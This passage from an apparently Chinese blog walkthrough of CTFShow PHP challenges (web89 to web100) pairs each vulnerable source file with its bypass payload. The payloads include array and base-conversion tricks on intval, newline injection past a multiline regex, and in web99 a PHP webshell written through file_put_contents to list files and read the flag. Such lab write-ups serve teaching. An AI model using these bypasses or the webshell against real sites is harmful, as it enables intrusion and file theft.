class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ol>
<li>æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ï¼š æ•°å­— 0-9ï¼Œ å°±ä¼š ç‹—å¸¦ no no no </li>
<li>intval() å‡½æ•°ï¼šè·å–å˜é‡çš„æ•´æ•°å€¼</li>
</ol>
<p><strong>å®éªŒï¼š</strong></p>
<ol>
<li>æ•°ç»„ç»•è¿‡ : ?num[]</li>
</ol>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web89.png"></p>
<h2 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 16:06:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>intval($num,0) ç¬¬äºŒä½å‚æ•°ä¸º 0</p>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web90.png"></p>
<p>iintval() è·å–å˜é‡çš„æ•´æ•°å€¼:</p>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web90_1.png"></p>
<p>ä»è¿™å¯ä»¥çœ‹å‡ºï¼Œæ•´ä¸ªå‡½æ•°åªè¯»å–äº†ä¼ å…¥çš„å­—ç¬¦ä¸²ä¸­çš„æ•°å­—éƒ¨åˆ†ä¸”åªå–å­—æ¯å‰é¢</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?num=<span class="number">4476</span>a</span><br></pre></td></tr></table></figure>

<p>å°† num==4476a ä¼ å…¥å°†å¾—åˆ° 4476 é‚£ä¹ˆ if(intval($num,0) === 4476) æˆç«‹ å³å¯è·å¾—flag</p>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web90_2.png"></p>
<h2 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h2><p>æºç :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: Firebasky</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-18 16:16:09</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">show_source(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">$a=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123;</span><br><span class="line">    if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123;</span><br><span class="line">        echo &#x27;hacker&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &#x27;nonononono&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Notice: Undefined index: cmd in /var/www/html/index.php on line 15</span><br><span class="line">nonononono</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ol>
<li><p>æ­£åˆ™è¡¨è¾¾å¼ : /^php$/im:</p>
<p>^  : åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®</p>
<p>$  : åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„ç»“å°¾ä½ç½®</p>
<p>i   : ä¸åŒºåˆ†å¤§å°å†™</p>
<p>m : å¤šè¡ŒåŒ¹é… ä½¿è¾¹ç•Œå­—ç¬¦ <strong>^</strong> å’Œ <strong>$</strong> åŒ¹é…æ¯ä¸€è¡Œçš„å¼€å¤´å’Œç»“å°¾</p>
<p>é‚£ä¹ˆè¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼ ï¼Œè¾“å…¥çš„å­—ç¬¦ä¸²ä¸º php æ‰ä¸ºçœŸæ‰èƒ½è¿›å…¥æ­¤ if ä¸­</p>
</li>
<li><p>æ­£åˆ™è¡¨ç¤º /^php$/i: ä¸ä¸Šä¸€ä¸ªæ­£åˆ™ç›¸æ¯” å°‘äº† å¤šè¡ŒåŒ¹é…ã€‚ é‚£ä¹ˆçªå…¥ç‚¹å°±åœ¨ è¿™ä¸ª må¤šåŒ¹é…ä¸Šé¢ã€‚</p>
</li>
<li><p>ç¬¬äºŒä¸ª if è¯­å¥ä¸èƒ½æ»¡è¶³æ‰èƒ½å¾—åˆ° flag æ„æ€å°±æ˜¯ ç¬¬äºŒä¸ª if å®ƒä¸èƒ½åŒ¹é…åˆ°å­—ç¬¦ä¸² php </p>
</li>
<li><p>ç¬¬ä¸€ä¸ª if è¯­å¥å¤šè¡ŒåŒ¹é…åˆ°å­—ç¬¦ä¸² php</p>
</li>
<li><p>å› æ­¤å¾—è®©ç¬¬ä¸€ä¸ªå¤šè¡ŒåŒ¹é…èƒ½åŒ¹é…åˆ°å­—ç¬¦ä¸² php è€Œ ç¬¬äºŒä¸ªå•è¡ŒåŒ¹é…ä¸èƒ½åŒ¹é…åˆ°å­—ç¬¦ä¸² php å°±å¾—è®©å­—ç¬¦ä¸²ç¬¬ä¸€è¡Œä¸ä¸º php ç¬¬äºŒè¡Œæˆ–è€…ç¬¬ä¸‰è¡Œâ€¦â€¦ ä¸ºphp </p>
</li>
<li><p>æ„å»º playload notphpæ¢è¡Œphp â€“ &gt; notphp%0a123%0aphp (ä¸€å…±ä¸‰è¡Œ %0a ä¸ºæ¢è¡Œç¬¦çš„ URLç¼–ç )</p>
</li>
</ol>
<p><strong>å®éªŒï¼š</strong></p>
<ol>
<li>ç›´æ¥è¾“å…¥ php æ•ˆæœ:</li>
</ol>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web91.png"></p>
<ol start="2">
<li>notphp%0a123%0aphp</li>
</ol>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web91_1.png"></p>
<h2 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 16:29:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ol>
<li>intval() è·å–å˜é‡çš„æ•´æ•°å€¼ï¼Œ<strong>intval</strong>    ( <a href="mk:@MSITStore:D:\MY-CODE\PHP\php7.3.8æ‰‹å†Œï¼ˆå®˜ç½‘ï¼‰\php7.3.8æ‰‹å†Œï¼ˆå®˜ç½‘ï¼‰\php7.3.8ï¼ˆå®˜ç½‘ä¸‹è½½ï¼‰.chm::/res/language.pseudo-types.html#language.types.mixed">mixed</a> <code>$var</code>   [, int <code>$base</code> = 10  ] ) : int</li>
<li>ä½¿ç”¨æŒ‡å®šè¿›åˆ¶ base è½¬æ¢(é»˜è®¤åè¿›åˆ¶) baseæ˜¯ 0 ï¼Œæ£€æµ‹ var çš„æ ¼å¼æ¥å†³å®šä½¿ç”¨çš„è¿›åˆ¶:</li>
</ol>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web92.png"></p>
<ol start="3">
<li>if(intval($num,0)==4476){echo $flag;} æ­¤å¤„ == ä¸ºå¼±æ¯”è¾ƒï¼Œåªæ¯”è¾ƒæ•°å€¼ï¼Œä¸æ¯”è¾ƒç±»å‹ï¼Œé‚£ä¹ˆå°† 4476 è½¬æ¢ä¸ºå…«è¿›åˆ¶(010574)æˆ–åå…­è¿›åˆ¶(0x117c)ï¼Œå°±èƒ½ä½¿æ¯”è¾ƒæˆç«‹å¹¶å¾—åˆ° flag</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?num=<span class="number">0x117c</span></span><br><span class="line">?num=<span class="number">010574</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web92_1.png"></p>
<h2 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h2><p>æºç :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: Firebasky</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-18 16:32:58</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if($num==4476)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num,0)==4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo intval($num,0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ol>
<li>æ­¤é¢˜ç›¸è¾ƒäºä¸Šä¸€é¢˜ å¤šäº†æ­£åˆ™åŒ¹é…äº† <strong>å­—æ¯</strong>ï¼Œ é‚£ä¹ˆå…­è¿›åˆ¶ 0x å°†å¤±æ•ˆ</li>
<li>å…«è¿›åˆ¶(010574)</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?num=<span class="number">010574</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web93.png"></p>
<h2 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h2><p>æºç :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-18 16:46:19</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if($num===&quot;4476&quot;)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!strpos($num, &quot;0&quot;))&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num,0)===4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ol>
<li>æ­¤é¢˜ç›¸è¾ƒäºä¸Šä¸€é¢˜å¤šäº† strpos($num,â€™0â€™)  æŸ¥æ‰¾å­—ç¬¦ä¸² 0 é¦–æ¬¡å‡ºç°çš„ä½ç½®</li>
<li>å°æ•°ç‚¹ç»•è¿‡: 4476.0</li>
</ol>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web94.png"></p>
<h2 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 16:53:59</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ol>
<li>ç›¸è¾ƒäºä¸Šä¸€é¢˜å¯¹å°æ•°ç‚¹è¿›è¡Œäº†åŒ¹é…</li>
<li>æ–°æ–¹æ³•: strpos() ç”¨ %0a(æ¢è¡Œ), %20(ç©ºæ ¼), %2b(+), ç©ºæ ¼ ç»•è¿‡</li>
<li>%0a010574, %20010574, %2b010574  </li>
</ol>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web95.png"></p>
<h2 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h2><p>æºç :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-18 19:21:24</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;u&#x27;]))&#123;</span><br><span class="line">    if($_GET[&#x27;u&#x27;]==&#x27;flag.php&#x27;)&#123;</span><br><span class="line">        die(&quot;no no no&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        highlight_file($_GET[&#x27;u&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ol>
<li>if GET åˆ°çš„å­—ç¬¦ä¸²ä¸º flag.php åˆ™ä¼šç‹—å¸¦ã€‚</li>
<li>è€Œæ•´ä¸ªä»£ç ï¼Œæœ€å highlight_file() åœ¨ else ä¸Š ,é‚£ä¹ˆ GET åˆ°çš„ u å¿…é¡»ä¸º FALSEæ‰èƒ½æ‰§è¡Œelse,ä½†æ˜¯ u ä¸èƒ½ç­‰äº flag.php;ä¸è¿‡ highlight_file() ä½¿ç”¨è·¯å¾„ï¼Œé‚£ä¹ˆå°±æœ‰ ï¼š./flag.php .è¡¨ç¤ºå½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œæˆ–è€…ç»å¯¹è·¯å¾„ : /var/www/html/flag.php</li>
</ol>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web96.png"></p>
<h2 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h2><p>æºç :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-18 19:36:32</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123;</span><br><span class="line">	if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])</span><br><span class="line">		if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))</span><br><span class="line">			echo $flag;</span><br><span class="line">		else</span><br><span class="line">			print &#x27;Wrong.&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ol>
<li>çœ‹è§ md5 å°±è”æƒ³åˆ° md5ç¢°æ’å’Œæ•°ç»„ç»•è¿‡ï¼›ä¸‰ä¸ª = </li>
<li>æ•°ç»„</li>
<li>å¼ºç¢°æ’</li>
</ol>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web97.png"></p>
<h2 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h2><p>æºç :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-18 21:39:27</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;</span><br><span class="line">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;</span><br><span class="line">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;;</span><br><span class="line">highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ol>
<li>ä¸‰ç›®è¿ç®—ç¬¦ ä¸ &amp; </li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span> ? <span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span> : <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="comment">// å¦‚æœ$_GETä¸º True ï¼š$_GET = &amp;$_POST --&gt; GETå­˜åœ¨ï¼ŒGETå°±ç­‰äºPOST,POSTä¼šè¦†ç›–æ‰GET,æ­¤å¤„GETæ²¡æœ‰å…·ä½“çš„indexé‚£å°±éšä¾¿ä¸€ä¸ªè¯•è¯•ã€‚</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="comment">// æ²¡å•¥ç”¨å¤„</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span> ? <span class="variable">$flag</span> : <span class="keyword">__FILE__</span></span><br><span class="line"><span class="comment">// å¦‚æœ$_GET[&#x27;HTTP_FLAG&#x27;]ç­‰äº&#x27;flag&#x27; åˆ™ highlight_file($flag) å¦åˆ™å°± highlight_file(__FILE__)</span></span><br></pre></td></tr></table></figure>

<pre><code> 2. POST ä¼šè¦†ç›–æ‰ GET
</code></pre>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web98.png"></p>
<h2 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h2><p>æºç :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$allow = array();// ç©ºæ•°ç»„</span><br><span class="line">// 0x36d = 877 for å¾ªç¯ç”Ÿæˆ 1 åˆ° $i ä¹‹é—´çš„éšæœºæ•°å¹¶å­˜å…¥åˆ°æ•°ç»„ $allow </span><br><span class="line">// array_push() ç›¸å½“äº python ä¸­ add()æ–¹æ³•</span><br><span class="line">for($i=36; $i&lt;0x36d; $i++)&#123;</span><br><span class="line">	array_push($allow, rand(1, $i));</span><br><span class="line">&#125;</span><br><span class="line">//var_dump($allow);</span><br><span class="line">// in_array( mixed $needle, array $haystack[, bool $strict = FALSE] ) : bool</span><br><span class="line">// in_array() æ£€æŸ¥æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŸä¸ªå€¼ å¦‚æœæ²¡æœ‰è®¾ç½® strict åˆ™ä½¿ç”¨å®½æ¾çš„æ¯”è¾ƒï¼Œå°±ä¸ä¼šæ£€æŸ¥æŸ¥æ‰¾çš„æŸä¸ªå€¼æ˜¯å¦ä¸æ•°ç»„ä¸­ç±»å‹ä¸€è‡´ </span><br><span class="line">// æ£€æŸ¥æ•°ç»„ $allow ä¸­æ˜¯å¦å­˜åœ¨ $_GET[&#x27;n&#x27;]</span><br><span class="line">// file_put_contents($_GET[&#x27;n&#x27;],$_POST[&#x27;content&#x27;])å°†contentä¸nå†™å…¥æ–‡ä»¶</span><br><span class="line">if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123;</span><br><span class="line">    file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web99.png"></p>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web99_1.png"></p>
<ol>
<li>å°† <?php system('ls');?> å†™å…¥ 1.php,ç„¶åè®¿é—® 1.phpå¹¶æ‰¾åˆ° flag36d.php</li>
</ol>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web99_2.png"></p>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web99_3.png"></p>
<ol start="2">
<li><?php system('tac flag36d.php');?> å†™å…¥ 1.php ç„¶åè®¿é—®</li>
</ol>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web99_4.png"></p>
<h2 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h2><p>æºç :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-21 22:10:28</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;ctfshow.php&quot;);</span><br><span class="line">//flag in class ctfshow;</span><br><span class="line">$ctfshow = new ctfshow();</span><br><span class="line">$v1=$_GET[&#x27;v1&#x27;];</span><br><span class="line">$v2=$_GET[&#x27;v2&#x27;];</span><br><span class="line">$v3=$_GET[&#x27;v3&#x27;];</span><br><span class="line">$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</span><br><span class="line">if($v0)&#123;</span><br><span class="line">    